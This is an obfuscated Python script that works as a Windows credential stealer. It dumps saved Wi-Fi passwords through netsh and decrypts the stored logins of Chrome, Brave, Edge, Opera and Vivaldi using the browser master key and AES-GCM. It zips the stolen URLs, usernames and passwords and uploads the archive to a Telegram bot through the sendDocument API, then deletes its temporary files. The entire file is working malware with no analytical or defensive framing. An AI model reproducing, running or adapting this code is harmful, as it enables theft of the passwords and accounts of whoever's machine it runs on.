import os #line:1
import json #line:2
import base64 #line:3
import sqlite3 #line:4
import shutil #line:5
import win32crypt #line:6
from Crypto .Cipher import AES #line:7
import subprocess #line:8
import zipfile #line:9
import tempfile #line:10
import requests #line:11
from datetime import datetime #line:12
p1 ='TELEGRAM_TOKEN'#line:15
p2 ='TELEGRAM_ID'#line:16
k4 ={"Chrome":r"%LOCALAPPDATA%\Google\Chrome\User Data\Default","Brave":r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default","Edge":r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default","Opera":r"%APPDATA%\Opera Software\Opera Stable","Vivaldi":r"%LOCALAPPDATA%\Vivaldi\User Data\Default",}#line:24
def q7 (OO0O0000O00O0000O ):#line:27
    O0OOO0O0OO0OOOO0O =f"https://api.telegram.org/bot{p1}/sendDocument"#line:28
    with open (OO0O0000O00O0000O ,'rb')as OO0O0OO0O0O0OOO0O :#line:29
        OOOO000O0OO00OO00 ={'document':OO0O0OO0O0O0OOO0O }#line:30
        O0OO00000OOOO00O0 ={'chat_id':p2 }#line:31
        return requests .post (O0OOO0O0OO0OOOO0O ,files =OOOO000O0OO00OO00 ,data =O0OO00000OOOO00O0 )#line:32
def w2 (O00000O00OOOO0000 ):#line:35
    try :#line:36
        if O00000O00OOOO0000 =="Opera":#line:37
            OOOO0O00000O000OO =os .path .expandvars (r"%APPDATA%\Opera Software\Opera Stable\Local State")#line:38
        else :#line:39
            OOOO0O00000O000OO =os .path .expandvars (os .path .join (os .path .dirname (k4 [O00000O00OOOO0000 ]),"Local State"))#line:42
        with open (OOOO0O00000O000OO ,"r",encoding ="utf-8")as OOOO0O00O00O0OOO0 :#line:43
            OOOO0O0O000000OOO =json .load (OOOO0O00O00O0OOO0 )#line:44
        O00OOO0O00O0OO0OO =base64 .b64decode (OOOO0O0O000000OOO ["os_crypt"]["encrypted_key"])[5 :]#line:45
        return win32crypt .CryptUnprotectData (O00OOO0O00O0OO0OO ,None ,None ,None ,0 )[1 ]#line:46
    except Exception :#line:47
        return None #line:48
def e3 (O000OOO00OOOO000O ,O0OO000OO0O0O0O00 ):#line:50
    try :#line:51
        if not O000OOO00OOOO000O :#line:52
            return "Empty password"#line:53
        if O000OOO00OOOO000O [:3 ]==b'v10':#line:54
            O000O0OO00OO00000 =O000OOO00OOOO000O [3 :15 ]#line:55
            OO0O000O0OO0O0O00 =O000OOO00OOOO000O [15 :-16 ]#line:56
            OOOO0000000O0O00O =O000OOO00OOOO000O [-16 :]#line:57
            O0OO0O0OOO000O00O =AES .new (O0OO000OO0O0O0O00 ,AES .MODE_GCM ,nonce =O000O0OO00OO00000 )#line:58
            return O0OO0O0OOO000O00O .decrypt_and_verify (OO0O000O0OO0O0O00 ,OOOO0000000O0O00O ).decode ()#line:59
        else :#line:60
            return win32crypt .CryptUnprotectData (O000OOO00OOOO000O ,None ,None ,None ,0 )[1 ].decode ()#line:61
    except :#line:62
        return "Failed to decrypt"#line:63
def t4 (O0000O0000000O0O0 ,O0O00000000OO0OO0 ,O000OOO0O000000OO ):#line:66
    OOOO000OOO00OO0O0 =os .path .join (os .path .expandvars (O0O00000000OO0OO0 ),"Login Data")#line:67
    if not os .path .exists (OOOO000OOO00OO0O0 ):#line:68
        return #line:69
    OO00OOO000OO00OOO =os .path .join (tempfile .gettempdir (),f"{O0000O0000000O0O0}_k22.db")#line:70
    shutil .copy2 (OOOO000OOO00OO0O0 ,OO00OOO000OO00OOO )#line:71
    O0O0O0OO0OO0OOO00 =w2 (O0000O0000000O0O0 )#line:72
    if not O0O0O0OO0OO0OOO00 :#line:73
        return #line:74
    try :#line:75
        OOOO00O00O0O0000O =sqlite3 .connect (OO00OOO000OO00OOO )#line:76
        OO0OO0OOO00O0OO0O =OOOO00O00O0O0000O .cursor ()#line:77
        OO0OO0OOO00O0OO0O .execute ("SELECT origin_url, username_value, password_value FROM logins")#line:78
        with open (O000OOO0O000000OO ,'a',encoding ='utf-8')as OO00OOO0000OOO00O :#line:79
            for O000O0O0000000O00 ,OOOO0O0O0O0O000OO ,OO00O00O0OOOOO00O in OO0OO0OOO00O0OO0O .fetchall ():#line:80
                O0O00000O00OOOOOO =e3 (OO00O00O0OOOOO00O ,O0O0O0OO0OO0OOO00 )#line:81
                if O0O00000O00OOOOOO not in ("Failed to decrypt","Empty password"):#line:82
                    OO00OOO0000OOO00O .write (f"URL: {O000O0O0000000O00}\nUser: {OOOO0O0O0O0O000OO}\nPass: {O0O00000O00OOOOOO}\n\n")#line:83
        OO0OO0OOO00O0OO0O .close ()#line:84
        OOOO00O00O0O0000O .close ()#line:85
    except :#line:86
        pass #line:87
    finally :#line:88
        if os .path .exists (OO00OOO000OO00OOO ):#line:89
            os .remove (OO00OOO000OO00OOO )#line:90
def r5 (OO000OOO00OO00000 ):#line:93
    O00OOOO0O0OOO0000 =['cp850','utf-8','latin-1']#line:94
    for O00OO0000O000OO00 in O00OOOO0O0OOO0000 :#line:95
        try :#line:96
            OOO0O0OO00O0O00OO =subprocess .Popen (OO000OOO00OO00000 ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,shell =True )#line:97
            OOOOOO0000O000OOO ,_OOO0000OO00O0OO00 =OOO0O0OO00O0O00OO .communicate ()#line:98
            OO0OO00OO0O00O00O =OOOOOO0000O000OOO .decode (O00OO0000O000OO00 ,errors ="ignore")#line:99
            if "Contenu de la clé"in OO0OO00OO0O00O00O or "Key Content"in OO0OO00OO0O00O00O :#line:100
                return OO0OO00OO0O00O00O #line:101
        except :#line:102
            continue #line:103
    return OO0OO00OO0O00O00O #line:104
def y6 (O0O0000O00OO000OO ):#line:106
    O00O0OO0O0O00O00O =r5 ("netsh wlan show profiles")#line:107
    OO0OO0OOO0O000OOO =[]#line:108
    for OOO0O00OOO0000O0O in O00O0OO0O0O00O00O .splitlines ():#line:109
        if "Profil Tous les utilisateurs"in OOO0O00OOO0000O0O or "All User Profile"in OOO0O00OOO0000O0O :#line:110
            OO0OO0OO0O0OOO000 =OOO0O00OOO0000O0O .split (':',1 )#line:111
            if len (OO0OO0OO0O0OOO000 )>1 :#line:112
                OO0OO0OOO0O000OOO .append (OO0OO0OO0O0OOO000 [1 ].strip ())#line:113
    O00OOOOO0O000O00O =[]#line:114
    for O00O0OOO00000000O in OO0OO0OOO0O000OOO :#line:115
        OOO00OOOOOOO000OO =f'netsh wlan show profile name="{O00O0OOO00000000O}" key=clear'#line:116
        OOO000000O00O0O0O =r5 (OOO00OOOOOOO000OO )#line:117
        O0OOOO0000O0O0O0O ="[Non trouvé]"#line:118
        for O00OOOO0O0O0OOO00 in OOO000000O00O0O0O .splitlines ():#line:119
            if "Contenu de la clé"in O00OOOO0O0O0OOO00 or "Key Content"in O00OOOO0O0O0OOO00 :#line:120
                O00OOOO00OO0O000O =O00OOOO0O0O0OOO00 .split (':',1 )#line:121
                if len (O00OOOO00OO0O000O )>1 :#line:122
                    O0OOOO0000O0O0O0O =O00OOOO00OO0O000O [1 ].strip ()#line:123
                    break #line:124
        O00OOOOO0O000O00O .append (f"SSID: {O00O0OOO00000000O} | Password: {O0OOOO0000O0O0O0O}")#line:125
    with open (O0O0000O00OO000OO ,'w',encoding ='utf-8')as OO00OOO000000O0O0 :#line:126
        for OO0O0OO00OO00O00O in O00OOOOO0O000O00O :#line:127
            OO00OOO000000O0O0 .write (OO0O0OO00OO00O00O +"\n")#line:128
def u7 (OO000OO0O000OO0O0 ,OOOOO000000000000 ):#line:131
    OO0OOOO0OOO00OOO0 =datetime .now ().strftime ("%Y-%m-%d")#line:132
    OO00O0O0O00O0OO00 =f"{OO0OOOO0OOO00OOO0}.m55.zip"#line:133
    OO0O000OOO00O0OOO =os .path .join (tempfile .gettempdir (),OO00O0O0O00O0OO00 )#line:134
    with zipfile .ZipFile (OO0O000OOO00O0OOO ,'w')as OOOO0O0O00OOO0OOO :#line:135
        OOOO0O0O00OOO0OOO .write (OO000OO0O000OO0O0 ,"t1.txt")#line:136
        OOOO0O0O00OOO0OOO .write (OOOOO000000000000 ,"t2.txt")#line:137
    return OO0O000OOO00O0OOO #line:138
def x8 ():#line:141
    OO00OOOO00OO0OO0O =os .path .join (tempfile .gettempdir (),"t1.txt")#line:142
    OO00OOO0O0OOOOOOO =os .path .join (tempfile .gettempdir (),"t2.txt")#line:143
    y6 (OO00OOOO00OO0OO0O )#line:145
    for O0OO00O0O000OOOOO ,OOO00O0OO0OO00OO0 in k4 .items ():#line:146
        t4 (O0OO00O0O000OOOOO ,OOO00O0OO0OO00OO0 ,OO00OOO0O0OOOOOOO )#line:147
    OOO0OOOOOOOOOO000 =u7 (OO00OOOO00OO0OO0O ,OO00OOO0O0OOOOOOO )#line:149
    q7 (OOO0OOOOOOOOOO000 )#line:150
    for O0OO0O0000O0OO0OO in [OO00OOOO00OO0OO0O ,OO00OOO0O0OOOOOOO ,OOO0OOOOOOOOOO000 ]:#line:152
        try :#line:153
            os .remove (O0OO0O0000O0OO0OO )#line:154
        except :#line:155
            pass #line:156
if __name__ =="__main__":#line:158
    x8 ()